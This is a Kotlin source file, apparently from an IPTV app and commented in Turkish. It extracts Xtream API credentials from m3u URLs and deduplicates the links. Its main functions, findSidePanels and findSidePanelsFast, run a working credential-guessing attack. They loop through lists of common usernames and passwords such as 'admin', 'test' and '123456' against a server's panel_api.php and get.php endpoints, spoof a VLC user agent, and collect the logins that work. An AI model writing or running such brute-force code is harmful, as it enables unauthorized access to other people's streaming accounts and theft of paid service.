package com.alibaba.core.common

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import java.util.concurrent.TimeUnit

private val urlRegex = Regex("""https?://[^\s"']+""", RegexOption.IGNORE_CASE)
private val schemeRegex = Regex("""https?://""", RegexOption.IGNORE_CASE)

// Yan panel bulma için HTTP client
private val sidePanelClient by lazy {
    OkHttpClient.Builder()
        .connectTimeout(5, TimeUnit.SECONDS)
        .readTimeout(5, TimeUnit.SECONDS)
        .followRedirects(true)
        .build()
}

// Xtream API URL'lerinden sunucu+kullanıcı+şifre çıkar
fun extractCredentials(url: String): Triple<String, String, String>? {
    return try {
        val uri = java.net.URI(url)
        val host = uri.host ?: return null
        val port = if (uri.port > 0) uri.port else 80
        val server = "$host:$port"
        
        // Query parametrelerinden username ve password çıkar
        val query = uri.query ?: return null
        val params = query.split("&").associate { 
            val parts = it.split("=", limit = 2)
            if (parts.size == 2) parts[0] to parts[1] else parts[0] to ""
        }
        
        val username = params["username"] ?: params["user"] ?: return null
        val password = params["password"] ?: params["pass"] ?: return null
        
        Triple(server, username, password)
    } catch (e: Exception) {
        null
    }
}

fun extractIptvUrls(text: String): List<String> {
    val allUrls = urlRegex.findAll(text)
        .flatMap { m -> splitConcatenatedUrls(m.value).asSequence() }
        .map { it.trim().trimEnd(',', ';') }
        .filter { it.contains("m3u", ignoreCase = true) || it.contains("m3u8", ignoreCase = true) }
        .distinct()
        .toList()
    
    // Aynı sunucu+kullanıcı+şifre olan linkleri ayıkla (m3u8 tercihli)
    val seen = mutableSetOf<String>() // server:username:password
    val result = mutableListOf<String>()
    
    // Önce m3u8 olanları ekle
    for (url in allUrls.sortedByDescending { it.contains("m3u8", ignoreCase = true) }) {
        val creds = extractCredentials(url)
        if (creds != null) {
            val key = "${creds.first}:${creds.second}:${creds.third}"
            if (key !in seen) {
                seen.add(key)
                result.add(url)
            }
        } else {
            // Credentials çıkarılamayan URL'leri direkt ekle
            result.add(url)
        }
    }
    
    return result
}

data class SidePanelResult(
    val url: String,
    val username: String,
    val password: String,
    val isWorking: Boolean,
    val channelCount: Int = 0,
    val error: String? = null
)

// Yan panel bulma - verilen URL'den sunucu bilgilerini alıp farklı credential kombinasyonlarını dener
suspend fun findSidePanels(
    baseUrl: String,
    onProgress: (current: Int, total: Int, found: Int) -> Unit = { _, _, _ -> }
): List<SidePanelResult> = withContext(Dispatchers.IO) {
    val results = mutableListOf<SidePanelResult>()
    val creds = extractCredentials(baseUrl)
    
    if (creds == null) {
        return@withContext results
    }
    
    val (server, originalUser, originalPass) = creds
    val uri = java.net.URI(baseUrl)
    val scheme = uri.scheme ?: "http"
    val baseServerUrl = "$scheme://${uri.host}${if (uri.port > 0) ":${uri.port}" else ""}"
    
    // Yaygın kullanıcı adı ve şifre kombinasyonları
    val commonUsernames = listOf(
        originalUser,
        "test", "demo", "trial", "free", "guest", "user", "admin",
        "iptv", "live", "tv", "stream", "player", "watch",
        "1234", "12345", "123456", "1111", "2222", "3333",
        "abc", "xyz", "qwerty", "pass", "password",
        // Sayısal varyasyonlar
        "user1", "user2", "user3", "test1", "test2", "test3",
        "demo1", "demo2", "trial1", "trial2", "free1", "free2"
    ).distinct()
    
    val commonPasswords = listOf(
        originalPass,
        "test", "demo", "trial", "free", "guest", "user", "admin",
        "iptv", "live", "tv", "stream", "player", "watch",
        "1234", "12345", "123456", "1111", "2222", "3333",
        "abc", "xyz", "qwerty", "pass", "password",
        // Sayısal varyasyonlar
        "pass1", "pass2", "pass3", "test1", "test2", "test3"
    ).distinct()
    
    // Tüm kombinasyonları oluştur
    val combinations = mutableListOf<Pair<String, String>>()
    for (user in commonUsernames) {
        for (pass in commonPasswords) {
            if (user != originalUser || pass != originalPass) {
                combinations.add(user to pass)
            }
        }
    }
    
    // Orijinal credential'ı da ekle (ilk sırada)
    combinations.add(0, originalUser to originalPass)
    
    val total = combinations.size
    var found = 0
    
    for ((index, combo) in combinations.withIndex()) {
        val (username, password) = combo
        
        try {
            // Xtream API panel_api.php endpoint'ini dene
            val panelUrl = "$baseServerUrl/panel_api.php?username=$username&password=$password"
            val m3uUrl = "$baseServerUrl/get.php?username=$username&password=$password&type=m3u_plus&output=ts"
            
            val isWorking = withTimeoutOrNull(5000L) {
                checkPanelWorking(panelUrl, m3uUrl)
            } ?: false
            
            if (isWorking) {
                found++
                results.add(SidePanelResult(
                    url = m3uUrl,
                    username = username,
                    password = password,
                    isWorking = true
                ))
            }
            
            onProgress(index + 1, total, found)
            
        } catch (e: Exception) {
            // Hata durumunda devam et
        }
    }
    
    results
}

// Panel çalışıyor mu kontrol et
private suspend fun checkPanelWorking(panelUrl: String, m3uUrl: String): Boolean {
    return try {
        // Önce panel_api.php'yi dene
        val panelRequest = Request.Builder()
            .url(panelUrl)
            .head()
            .header("User-Agent", "VLC/3.0.18 LibVLC/3.0.18")
            .build()
        
        val panelResponse = sidePanelClient.newCall(panelRequest).execute()
        if (panelResponse.isSuccessful) {
            panelResponse.close()
            return true
        }
        panelResponse.close()
        
        // Panel API başarısızsa m3u endpoint'ini dene
        val m3uRequest = Request.Builder()
            .url(m3uUrl)
            .head()
            .header("User-Agent", "VLC/3.0.18 LibVLC/3.0.18")
            .build()
        
        val m3uResponse = sidePanelClient.newCall(m3uRequest).execute()
        val contentType = m3uResponse.header("Content-Type") ?: ""
        val contentLength = m3uResponse.header("Content-Length")?.toLongOrNull() ?: 0L
        m3uResponse.close()
        
        // M3U içeriği döndürüyorsa çalışıyor demektir
        m3uResponse.isSuccessful && (contentType.contains("mpegurl", ignoreCase = true) || 
            contentType.contains("audio", ignoreCase = true) ||
            contentType.contains("text", ignoreCase = true) ||
            contentLength > 100)
    } catch (e: Exception) {
        false
    }
}

// Hızlı yan panel tarama - sadece en yaygın kombinasyonları dener
suspend fun findSidePanelsFast(
    baseUrl: String,
    onProgress: (current: Int, total: Int, found: Int) -> Unit = { _, _, _ -> }
): List<SidePanelResult> = withContext(Dispatchers.IO) {
    val results = mutableListOf<SidePanelResult>()
    val creds = extractCredentials(baseUrl)
    
    if (creds == null) {
        return@withContext results
    }
    
    val (server, originalUser, originalPass) = creds
    val uri = java.net.URI(baseUrl)
    val scheme = uri.scheme ?: "http"
    val baseServerUrl = "$scheme://${uri.host}${if (uri.port > 0) ":${uri.port}" else ""}"
    
    // En yaygın kombinasyonlar (hızlı tarama için)
    val fastCombinations = listOf(
        originalUser to originalPass,
        "test" to "test",
        "demo" to "demo",
        "trial" to "trial",
        "free" to "free",
        "1234" to "1234",
        "12345" to "12345",
        "123456" to "123456",
        "admin" to "admin",
        "user" to "user",
        "iptv" to "iptv",
        "live" to "live",
        "guest" to "guest"
    ).distinctBy { "${it.first}:${it.second}" }
    
    val total = fastCombinations.size
    var found = 0
    
    for ((index, combo) in fastCombinations.withIndex()) {
        val (username, password) = combo
        
        try {
            val m3uUrl = "$baseServerUrl/get.php?username=$username&password=$password&type=m3u_plus&output=ts"
            
            val isWorking = withTimeoutOrNull(3000L) {
                checkPanelWorking("$baseServerUrl/panel_api.php?username=$username&password=$password", m3uUrl)
            } ?: false
            
            if (isWorking) {
                found++
                results.add(SidePanelResult(
                    url = m3uUrl,
                    username = username,
                    password = password,
                    isWorking = true
                ))
            }
            
            onProgress(index + 1, total, found)
            
        } catch (e: Exception) {
            // Devam et
        }
    }
    
    results
}

private fun splitConcatenatedUrls(raw: String): List<String> {
    val matches = schemeRegex.findAll(raw).toList()
    if (matches.size <= 1) return listOf(raw)

    val splitPoints = ArrayList<Int>(matches.size)
    splitPoints.add(0)
    for (i in 1 until matches.size) {
        val pos = matches[i].range.first
        if (pos <= 0) continue
        val prev = raw[pos - 1]
        if (!prev.isWhitespace() && prev != '=' && prev != '&' && prev != '?' && prev != '#') {
            splitPoints.add(pos)
        }
    }
    if (splitPoints.size == 1) return listOf(raw)

    val out = ArrayList<String>(splitPoints.size)
    for (i in splitPoints.indices) {
        val start = splitPoints[i]
        val end = if (i + 1 < splitPoints.size) splitPoints[i + 1] else raw.length
        if (start in 0..end && end <= raw.length) {
            out.add(raw.substring(start, end))
        }
    }
    return out
 }
